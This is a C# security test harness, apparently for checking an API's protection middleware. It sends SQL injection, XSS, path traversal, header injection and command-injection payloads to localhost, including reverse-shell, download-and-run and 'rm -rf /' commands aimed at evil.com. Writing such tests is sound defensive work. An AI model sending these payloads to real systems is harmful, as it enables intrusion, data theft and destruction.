using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Http;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace VulnerabilityTester
{
    class Program
    {
        private static readonly HttpClient client = new HttpClient();
        private const string BASE_URL = "https://localhost:5001";

        static async Task Main(string[] args)
        {
            Console.WriteLine("üîí SecureAPIs Vulnerability Testing Suite");
            Console.WriteLine("==========================================");
            Console.WriteLine();

            // Configure client to ignore SSL certificate errors for localhost testing
            var handler = new HttpClientHandler();
            handler.ServerCertificateCustomValidationCallback = (message, cert, chain, errors) => true;
            var client = new HttpClient(handler);

            try
            {
                // Test 1: SQL Injection Attacks
                Console.WriteLine("üóÉÔ∏è  Testing SQL Injection Vulnerabilities...");
                await TestSqlInjection(client);

                // Test 2: XSS Attacks
                Console.WriteLine("\nüï∑Ô∏è  Testing XSS (Cross-Site Scripting) Vulnerabilities...");
                await TestXssAttacks(client);

                // Test 3: Command Injection Attacks
                Console.WriteLine("\nüíª Testing Command Injection Vulnerabilities...");
                await TestCommandInjection(client);

                // Test 4: Path Traversal Attacks
                Console.WriteLine("\nüìÅ Testing Path Traversal Vulnerabilities...");
                await TestPathTraversal(client);

                // Test 5: CSRF Attacks
                Console.WriteLine("\nüîÑ Testing CSRF (Cross-Site Request Forgery) Vulnerabilities...");
                await TestCsrfAttacks(client);

                // Test 6: Rate Limiting
                Console.WriteLine("\n‚è±Ô∏è  Testing Rate Limiting...");
                await TestRateLimiting(client);

                // Test 7: Request Constraints
                Console.WriteLine("\nüìè Testing Request Constraints...");
                await TestRequestConstraints(client);

                // Test 8: Bot Detection
                Console.WriteLine("\nü§ñ Testing Bot Detection...");
                await TestBotDetection(client);

                // Test 9: Large Payload Attacks
                Console.WriteLine("\nüì¶ Testing Large Payload Handling...");
                await TestLargePayloads(client);

                // Test 10: Malformed Requests
                Console.WriteLine("\nüîß Testing Malformed Request Handling...");
                await TestMalformedRequests(client);

                // Test 11: Header Injection
                Console.WriteLine("\nüìã Testing Header Injection...");
                await TestHeaderInjection(client);

                // Test 12: URL Encoding Attacks
                Console.WriteLine("\nüîó Testing URL Encoding Attacks...");
                await TestUrlEncodingAttacks(client);

                Console.WriteLine("\n‚úÖ Vulnerability testing completed!");
                Console.WriteLine("Review the results above to ensure all security features are working correctly.");

            }
            catch (Exception ex)
            {
                Console.WriteLine($"‚ùå Error during testing: {ex.Message}");
            }
        }

        static async Task TestSqlInjection(HttpClient client)
        {
            var sqlPayloads = new[]
            {
                new { name = "' OR '1'='1", email = "admin@test.com" },
                new { name = "admin'; DROP TABLE users; --", email = "admin@test.com" },
                new { name = "'; SELECT * FROM users; --", email = "admin@test.com" },
                new { name = "admin' UNION SELECT password FROM users; --", email = "admin@test.com" },
                new { name = "'; EXEC xp_cmdshell 'net user'; --", email = "admin@test.com" },
                new { name = "admin'; WAITFOR DELAY '0:0:5'; --", email = "admin@test.com" },
                new { name = "'; INSERT INTO users VALUES ('hacker', 'pass'); --", email = "admin@test.com" },
                new { name = "admin' OR 1=1; --", email = "admin@test.com" },
                new { name = "'; INFORMATION_SCHEMA.TABLES; --", email = "admin@test.com" },
                new { name = "admin'; DECLARE @sql NVARCHAR(4000) SELECT @sql = 'SELECT * FROM sysobjects' EXEC(@sql); --", email = "admin@test.com" }
            };

            foreach (var payload in sqlPayloads)
            {
                await TestEndpoint(client, "POST", "/api/users", payload, "SQL Injection");
            }
        }

        static async Task TestXssAttacks(HttpClient client)
        {
            var xssPayloads = new[]
            {
                new { comment = "<script>alert('XSS')</script>" },
                new { comment = "<img src=x onerror=alert('XSS')>" },
                new { comment = "<iframe src='javascript:alert(\"XSS\")'></iframe>" },
                new { comment = "<svg onload=alert('XSS')>" },
                new { comment = "javascript:alert('XSS')" },
                new { comment = "<body onload=alert('XSS')>" },
                new { comment = "<input onfocus=alert('XSS') autofocus>" },
                new { comment = "<link rel=\"stylesheet\" href=\"javascript:alert('XSS');\">" },
                new { comment = "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS');\">" },
                new { comment = "<object data=\"javascript:alert('XSS')\"></object>" },
                new { comment = "<embed src=\"javascript:alert('XSS')\"></embed>" },
                new { comment = "<form><input type=\"submit\" formaction=\"javascript:alert('XSS')\"></form>" }
            };

            foreach (var payload in xssPayloads)
            {
                await TestEndpoint(client, "POST", "/api/comments", payload, "XSS Attack");
            }
        }

        static async Task TestCommandInjection(HttpClient client)
        {
            var commandPayloads = new[]
            {
                new { command = "echo hello; rm -rf /" },
                new { command = "ls; cat /etc/passwd" },
                new { command = "$(whoami)" },
                new { command = "`cat /etc/passwd`" },
                new { command = "echo hello && cat /etc/passwd" },
                new { command = "echo hello || rm -rf /" },
                new { command = "wget http://evil.com/malware.sh | bash" },
                new { command = "curl http://evil.com/malware.sh | sh" },
                new { command = "nc -e /bin/sh evil.com 4444" },
                new { command = "python -c 'import os; os.system(\"rm -rf /\")'" },
                new { command = "node -e 'require(\"child_process\").exec(\"rm -rf /\")'" },
                new { command = "perl -e 'system(\"rm -rf /\");'" }
            };

            foreach (var payload in commandPayloads)
            {
                await TestEndpoint(client, "POST", "/api/execute", payload, "Command Injection");
            }
        }

        static async Task TestPathTraversal(HttpClient client)
        {
            var pathPayloads = new[]
            {
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/etc/passwd",
                "/proc/self/environ",
                "/home/user/.ssh/id_rsa",
                "/root/.bash_history",
                "/var/log/apache2/access.log",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
                "%252e%252e%252fetc%252fpasswd",
                "....\\/....\\/....\\/etc/passwd",
                "..../..../..../etc/passwd",
                "..././..././..././etc/passwd"
            };

            foreach (var path in pathPayloads)
            {
                var payload = new { query = $"file={path}" };
                await TestEndpoint(client, "POST", "/api/search", payload, "Path Traversal");
            }
        }

        static async Task TestCsrfAttacks(HttpClient client)
        {
            var csrfPayloads = new[]
            {
                new { name = "hacked user", email = "hacker@test.com" }, // No CSRF token
                new { name = "hacked user", email = "hacker@test.com" }, // Invalid token
                new { name = "hacked user", email = "hacker@test.com" }, // Expired token
                new { name = "hacked user", email = "hacker@test.com" }  // Wrong token
            };

            foreach (var payload in csrfPayloads)
            {
                await TestEndpoint(client, "POST", "/api/users", payload, "CSRF Attack", false);
            }
        }

        static async Task TestRateLimiting(HttpClient client)
        {
            Console.Write("   Testing rate limiting with 200 rapid requests... ");

            var tasks = new List<Task>();
            var successCount = 0;
            var rateLimitCount = 0;
            var errorCount = 0;

            for (int i = 0; i < 200; i++)
            {
                tasks.Add(Task.Run(async () =>
                {
                    try
                    {
                        var response = await client.GetAsync($"{BASE_URL}/api/ratelimit");
                        if (response.IsSuccessStatusCode)
                        {
                            Interlocked.Increment(ref successCount);
                        }
                        else if (response.StatusCode == System.Net.HttpStatusCode.TooManyRequests)
                        {
                            Interlocked.Increment(ref rateLimitCount);
                        }
                        else
                        {
                            Interlocked.Increment(ref errorCount);
                        }
                    }
                    catch
                    {
                        Interlocked.Increment(ref errorCount);
                    }
                }));
            }

            await Task.WhenAll(tasks);

            Console.WriteLine($"‚úÖ Success: {successCount}, üö´ Rate Limited: {rateLimitCount}, ‚ùå Errors: {errorCount}");

            if (rateLimitCount > 0)
            {
                Console.WriteLine("   ‚úÖ Rate limiting is working correctly!");
            }
            else
            {
                Console.WriteLine("   ‚ö†Ô∏è  Rate limiting may not be active or configured too permissively.");
            }
        }

        static async Task TestRequestConstraints(HttpClient client)
        {
            // Test URI length limits
            var longUri = new string('a', 10000);
            await TestEndpoint(client, "GET", $"/api/test?data={longUri}", null, "URI Length Limit");

            // Test with invalid HTTP method
            await TestEndpoint(client, "INVALID", "/api/test", null, "Invalid HTTP Method");

            // Test with very long headers
            var longHeader = new string('x', 10000);
            var request = new HttpRequestMessage(HttpMethod.Get, $"{BASE_URL}/api/test");
            request.Headers.Add("X-Long-Header", longHeader);
            await TestRequest(client, request, "Long Header");
        }

        static async Task TestBotDetection(HttpClient client)
        {
            var botUserAgents = new[]
            {
                "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "curl/7.68.0",
                "python-requests/2.25.1",
                "Wget/1.20.3 (linux-gnu)",
                "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
                "axios/0.21.1",
                "PostmanRuntime/7.26.10",
                "Go-http-client/1.1",
                "Java/11.0.8",
                "Scrapy/2.4.1 (+https://scrapy.org)"
            };

            foreach (var userAgent in botUserAgents)
            {
                var request = new HttpRequestMessage(HttpMethod.Get, $"{BASE_URL}/api/test");
                request.Headers.Add("User-Agent", userAgent);
                await TestRequest(client, request, $"Bot User-Agent: {userAgent.Split(' ')[0]}");
            }
        }

        static async Task TestLargePayloads(HttpClient client)
        {
            // Test with very large payload
            var largeData = new string('x', 1000000); // 1MB payload
            var payload = new { data = largeData };
            await TestEndpoint(client, "POST", "/api/large", payload, "Large Payload (1MB)");
        }

        static async Task TestMalformedRequests(HttpClient client)
        {
            // Test with malformed JSON
            var malformedJson = "{ invalid json: missing quotes }";
            await TestRawRequest(client, "POST", "/api/users", malformedJson, "application/json", "Malformed JSON");

            // Test with invalid content type
            await TestRawRequest(client, "POST", "/api/users", "some data", "invalid/content-type", "Invalid Content-Type");

            // Test with null bytes
            var nullBytePayload = "test\0data";
            var nullByteJson = $"{{\"name\":\"{nullBytePayload}\",\"email\":\"test@test.com\"}}";
            await TestRawRequest(client, "POST", "/api/users", nullByteJson, "application/json", "Null Byte Injection");
        }

        static async Task TestHeaderInjection(HttpClient client)
        {
            var request = new HttpRequestMessage(HttpMethod.Get, $"{BASE_URL}/api/test");
            request.Headers.Add("X-Custom", "value\r\nSet-Cookie: malicious=value");
            request.Headers.Add("X-Another", "value\nX-Injection: injected");
            await TestRequest(client, request, "Header Injection");
        }

        static async Task TestUrlEncodingAttacks(HttpClient client)
        {
            var encodedAttacks = new[]
            {
                "/api/test?param=%27%20OR%20%271%27%3D%271", // ' OR '1'='1 encoded
                "/api/test?param=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E", // <script>alert('xss')</script>
                "/api/test?param=..%2F..%2F..%2Fetc%2Fpasswd", // ../../../etc/passwd
                "/api/test?param=%00", // Null byte
                "/api/test?param=%2527%2520OR%2520%25271%2527%253D%25271", // Double encoded SQL injection
                "/api/test?param=javascript%3Aalert%28%27xss%27%29", // javascript:alert('xss')
            };

            foreach (var url in encodedAttacks)
            {
                var request = new HttpRequestMessage(HttpMethod.Get, $"{BASE_URL}{url}");
                await TestRequest(client, request, $"URL Encoded Attack: {url.Split('?')[1]?.Split('=')[0] ?? url}");
            }
        }

        static async Task TestEndpoint(HttpClient client, string method, string endpoint, object? payload, string testType, bool expectSuccess = false)
        {
            try
            {
                HttpResponseMessage response;
                var url = $"{BASE_URL}{endpoint}";

                using var request = new HttpRequestMessage(new HttpMethod(method), url);

                if (payload != null)
                {
                    request.Content = JsonContent.Create(payload);
                }

                response = await client.SendAsync(request);

                if (expectSuccess)
                {
                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine($"   ‚úÖ {testType}: ALLOWED (as expected)");
                    }
                    else
                    {
                        Console.WriteLine($"   ‚ùå {testType}: BLOCKED (expected success but got {response.StatusCode})");
                    }
                }
                else
                {
                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine($"   ‚ö†Ô∏è  {testType}: ALLOWED (potential vulnerability!)");
                    }
                    else if (response.StatusCode == System.Net.HttpStatusCode.BadRequest)
                    {
                        Console.WriteLine($"   ‚úÖ {testType}: BLOCKED (400 Bad Request)");
                    }
                    else if (response.StatusCode == System.Net.HttpStatusCode.TooManyRequests)
                    {
                        Console.WriteLine($"   ‚úÖ {testType}: BLOCKED (429 Rate Limited)");
                    }
                    else
                    {
                        Console.WriteLine($"   ‚úÖ {testType}: BLOCKED ({response.StatusCode})");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"   ‚ùå {testType}: ERROR - {ex.Message}");
            }
        }

        static async Task TestRequest(HttpClient client, HttpRequestMessage request, string testType)
        {
            try
            {
                var response = await client.SendAsync(request);

                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine($"   ‚ö†Ô∏è  {testType}: ALLOWED (potential vulnerability!)");
                }
                else
                {
                    Console.WriteLine($"   ‚úÖ {testType}: BLOCKED ({response.StatusCode})");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"   ‚ùå {testType}: ERROR - {ex.Message}");
            }
        }

        static async Task TestRawRequest(HttpClient client, string method, string endpoint, string content, string contentType, string testType)
        {
            try
            {
                var request = new HttpRequestMessage(new HttpMethod(method), $"{BASE_URL}{endpoint}");
                request.Content = new StringContent(content, Encoding.UTF8, contentType);

                var response = await client.SendAsync(request);

                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine($"   ‚ö†Ô∏è  {testType}: ALLOWED (potential vulnerability!)");
                }
                else
                {
                    Console.WriteLine($"   ‚úÖ {testType}: BLOCKED ({response.StatusCode})");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"   ‚ùå {testType}: ERROR - {ex.Message}");
            }
        }
    }
}